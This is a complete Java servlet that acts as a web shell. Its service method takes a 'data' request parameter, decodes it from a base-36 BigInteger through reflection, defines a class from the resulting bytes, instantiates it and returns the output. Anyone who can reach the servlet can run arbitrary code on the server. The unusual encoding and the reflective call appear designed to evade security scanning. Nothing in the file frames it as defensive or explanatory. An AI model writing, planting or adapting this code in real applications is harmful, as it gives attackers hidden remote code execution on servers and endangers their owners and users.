package jakarta;

import jakarta.servlet.*;

import java.io.IOException;

/**
 * @author Wans
 * @since 2025/08/25
 */
public class BigIntegerClassLaoderServlet extends ClassLoader implements Servlet {

    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String data = req.getParameter("data");
        try {
            byte[] bytes = decodeBigInteger(data);
            Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
            res.getWriter().print(obj);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    static byte[] decodeBigInteger(String bigIntegerStr) throws Exception {
        Class<?> decoderClass = Class.forName("java.math.BigInteger");
        return (byte[]) decoderClass.getMethod("toByteArray").invoke(decoderClass.getConstructor(String.class, int.class).newInstance(bigIntegerStr, Character.MAX_RADIX));
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}
